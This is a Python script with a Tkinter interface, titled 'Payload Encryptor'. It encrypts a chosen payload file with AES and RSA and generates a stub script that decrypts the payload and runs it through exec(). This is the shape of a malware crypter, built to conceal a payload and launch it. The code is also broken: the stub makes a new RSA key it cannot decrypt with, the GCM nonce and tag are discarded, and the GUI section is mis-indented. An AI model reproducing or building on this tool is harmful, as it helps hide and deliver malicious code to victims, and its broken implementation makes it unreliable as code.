import os
import sys
import struct
import base64
import tkinter as tk
from tkinter import filedialog
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def encrypt_payload(payload_file):
    # RSA encryption of AES key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    aes_key = os.urandom(32)
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    # AES encryption of payload
    with open(payload_file, 'rb') as f:
        payload = f.read()
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(os.urandom(12)), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_payload = encryptor.update(payload) + encryptor.finalize()
    return encrypted_aes_key, encrypted_payload

def create_executable(stub, encrypted_aes_key, encrypted_payload):
    with open('combined.py', 'wb') as f:
        f.write(stub.format(encrypted_aes_key=encrypted_aes_key, encrypted_payload=encrypted_payload).encode())
    os.chmod('combined.py', 0o755)

def encrypt_payload_gui():
    root = tk.Tk()
    root.withdraw()

    # Get the payload file path from user
    file_path = filedialog.askopenfilename()
    if not file_path:
        return

    # Encrypt the payload
    encrypted_aes_key, encrypted_payload = encrypt_payload(file_path)

    # Create the executable file
    stub = '''
import os
import struct
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

def decrypt_and_execute(encrypted_aes_key, encrypted_payload):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(os.urandom(12)), backend=default_backend())
    decryptor = cipher.decryptor()
    payload = decryptor.update(encrypted_payload) + decryptor.finalize()
    exec(payload)

encrypted_aes_key = {encrypted_aes_key}
encrypted_payload = {encrypted_payload}
decrypt_and_execute(encrypted_aes_key, encrypted_payload)
'''
    create_executable(stub, encrypted_aes_key, encrypted_payload)

    # Show success message
    tk.messagebox.showinfo('Success', 'Encryption successful!')

if __name__ == '__main__':
    root = tk.Tk()
    root.title('Payload Encryptor')

    # Create the UI elements
label = tk.Label(root, text='Select the payload file to encrypt:')
label.pack()

# Create a frame to hold the file path input area and browse button
file_frame = tk.Frame(root)
file_frame.pack()

file_path_var = tk.StringVar()
browse_button = tk.Button(file_frame, text='Browse', command=lambda: file_path_var.set(filedialog.askopenfilename()))
browse_button.pack(side=tk.LEFT)

encrypt_button = tk.Button(root, text='Encrypt', command=lambda: encrypt_payload_gui())
encrypt_button.pack()

root.mainloop()
